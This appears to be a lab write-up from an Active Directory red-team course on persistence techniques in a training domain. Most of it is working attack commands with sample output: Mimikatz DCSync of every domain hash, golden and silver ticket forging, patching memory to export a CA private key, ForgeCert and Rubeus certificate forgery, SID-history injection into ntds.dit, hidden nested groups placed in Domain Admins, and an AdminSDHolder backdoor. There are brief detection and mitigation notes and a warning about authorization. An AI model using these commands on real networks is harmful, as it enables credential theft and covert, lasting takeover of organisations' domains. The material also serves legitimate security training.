# Persisting Active Directory

## 1. Through Credentials

### DCSync All

#### Requirements

* **Privileges:** Domain Admin *or* any account with **Replicating Directory Changes / Replicating Directory Changes All** (replication rights).
* **Tools:** Mimikatz (or any tool that can call MS-DRSR/DRSUAPI).
* **Access:** Network reachability to a Domain Controller and a host you can run Mimikatz from (often a compromised machine).
* **Target info:** Domain name and a reachable DC (e.g., `za.domain.loc` and `DC.za.domain.loc`).

#### How it works

1. Tool binds to the DC’s **MS-DRSR (DRSUAPI)** replication RPC interface as if it were a replication partner.
2. It issues replication calls (`GetNCChanges`/similar) requesting directory objects/attributes.
3. DC returns account attributes including **NTLM hashes** and Kerberos keys for any accounts the caller is authorized to replicate.
4. Using `/all` requests the whole domain partition — so with replication privileges you get hashes/keys for every account (including `krbtgt`).

```cmd
lsadump::dcsync /domain:za.domain.loc /user:<Your low-privilege AD Username>
```

```cmd
mimikatz # log usermname_dcdump.txt 
Using 'username_dcdump.txt' for logfile: OK
mimikatz # lsadump::dcsync /domain:za.domain.loc /all
```

* `/all` = whole-domain hashes if caller has replication rights.
* NTLM hashes can be cracked offline or used for pass-the-hash; `krbtgt` keys enable golden tickets.
* Detection: DRSUAPI/replication RPC from non-DC hosts; monitor and alert.
* Mitigate: restrict replication rights, tiered admin model, rotate `krbtgt`, enable replication auditing.

## 2. Through Tickets

![img](/img/PersistingAD/1.png)

The user makes an AS-REQ to the Key Distribution Centre (KDC) on the DC that includes a timestamp encrypted with the user's NTLM hash. Essentially, this is the request for a Ticket Granting Ticket (TGT). The DC checks the information and sends the TGT to the user. This TGT is signed with the KRBTGT account's password hash that is only stored on the DC. The user can now send this TGT to the DC to request a Ticket Granting Service (TGS) for the resource that the user wants to access. If the TGT checks out, the DC responds to the TGS that is encrypted with the NTLM hash of the service that the user is requesting access for. The user then presents this TGS to the service for access, which can verify the TGS since it knows its own hash and can grant the user access.

With all of that background theory being said, it is time to look into Golden and Silver tickets.

**Golden Tickets:**

Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the KRBTGT account's password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets:

* By injecting at this stage of the Kerberos process, we don't need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
* Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
* Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence.
* By default, the KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever.
* The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
* Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
* Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
* We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.
* Apart from the KRBTGT account's password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the KRBTGT account's password hash, we would already be in a position where we can recover the other pieces of the required information.

**Silver Tickets:**

Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets:

* The generated TGS is signed by the machine account of the host we are targeting.
* The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.
* Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
* Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
* The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
* While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

### Forging Tickets

```powershell
PS C:\Users\Administrator.ZA> Get-ADDomain

AllowedDNSSuffixes                 : {}
ComputersContainer                 : CN=Computers,DC=za,DC=domain,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=domain,DC=loc
DistinguishedName                  : DC=za,DC=domain,DC=loc
DNSRoot                            : za.domain.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=domain,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=domain,DC=loc
[....]
```

Now that we have all the required information, we can relaunch Mimikatz:

**Golden Tickets:**

```cmd
mimikatz # kerberos::golden /admin:FAKEAccount /domain:za.domain.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

* **/admin** - The username we want to impersonate. This does not have to be a valid user.
* **/domain** - The FQDN of the domain we want to generate the ticket for.
* **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
* **/sid** -The SID of the domain we want to generate the ticket for.
* **/krbtgt** -The NTLM hash of the KRBTGT account.
* **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
* **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
* **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

**Silver Tickets:**

```cmd
mimikatz # kerberos::golden /admin:StillFAKEAccount /domain:za.domain.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

* **/admin** - The username we want to impersonate. This does not have to be a valid user.
* **/domain** - The FQDN of the domain we want to generate the ticket for.
* **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
* **/sid** -The SID of the domain we want to generate the ticket for.
* **/target** - The hostname of our target server. It can be any domain-joined host.
* **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of SERVER1$. The $ indicates that it is a machine account.
* **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
* **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

---

## **Warning**

The techniques below are highly invasive and often require a full domain rebuild to recover. Only use them with explicit, documented authorization - and only when absolutely necessary - because they’re hard to remove. In most real-world red-team engagements you should simulate these persistence actions rather than actually performing them.

---

## 3. Through Certificates

### Extracting the Private Key

```cmd
mimikatz # crypto::certificates /systemstore:local_machine
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=domain, DC=za, CN=za-DC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
[....]
```

Some of these certificates can be set to not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable:

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched
```

With these services patched, we can use Mimikatz to export the certificates:

```cmd
mimikatz # crypto::certificates /systemstore:local_machine /export
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=domain, DC=za, CN=za-DC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
[....]
```

In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz. Download or copy this certificate to your AttackBox using SCP, and then copy it to your low-privileged user's home directory on WRK1. You can also perform the rest of the steps on your own non-domain-joined Windows machine if you prefer.

### Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps ForgeCert tool to forge a Client Authenticate certificate for any user we want.

```powershell
ForgeCert.exe --CaCertPath za-DC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.domain.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

* **CaCertPath** - The path to our exported CA certificate.
* **CaCertPassword** - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
* **Subject** - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* **SubjectAltName** - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* **NewCertPath** - The path to where ForgeCert will store the generated certificate.
* **NewCertPassword** - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.domain.loc /dc:<IP of domain controller>
```

* /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
* /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
* /certificate - Path to the certificate we have generated
* /password - The password for our certificate file
* /outfile - The file where our TGT will be output to
* /domain - The FQDN of the domain we are currently attacking
* /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running.

Now we can use Mimikatz to load the TGT and authenticate to DC:

```cmd
mimikatz # kerberos::ptt <output file from rubeus>

* File: 'administrator.kirbi': OK

mimikatz # exit
Bye! 
```

## 4. Through SID History

### Forging History

Firstly, let's make sure that our low-privilege user does not currently have any information in their SID history, We can overwrite it though:

```powershell
PS C:\Users\Administrator.ZA> Get-ADUser <your ad username> -properties sidhistory,memberof

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=domain,DC=loc
Enabled           : True
GivenName         : Aaron
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=domain,DC=loc}
Name              : aaron.jones
ObjectClass       : user
ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
SamAccountName    : aaron.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
SIDHistory        : {}
Surname           : Jones
UserPrincipalName :
```

This confirms that our user does not currently have any SID History set. Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:

```powershell
PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"

DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=domain,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512
```

We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the DSInternals tools to directly patch the ntds.dit file, the AD database where all information is stored:

```powershell
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds  
```

The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.

## 5. Through Group Membership

### Nesting Our Persistence

In order to simulate the persistence, we will create some of our own groups. Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):

```powershell
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=domain,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Let's now create another group in the People->Sales OU and add our previous group as a member:

```powershell
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=domain,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "nestgroup2" -Members "nestgroup1"
```

We can do this a couple more times, every time adding the previous group as a member:

```powershell
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "nestgroup3" -Members "nestgroup2"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "nestgroup4" -Members "nestgroup3"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "nestgroup5" -Members "nestgroup4"
```

With the last group, let's now add that group to the Domain Admins group:

```powershell
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "nestgroup5"
```

Lastly, let's add our low-privileged AD user to the first group we created:

```powershell
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "nestgroup1" -Members "<low privileged username>"
```

## 6. Persistence through ACLs

### Persisting with AdminSDHolder

In order to deploy our persistence to the AdminSDHolder, we will use Microsoft Management Console (MMC).

Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:

Navigate to the Security of the group (Right-click->Properties->Security)

Let's add our low-privileged user and grant Full Control
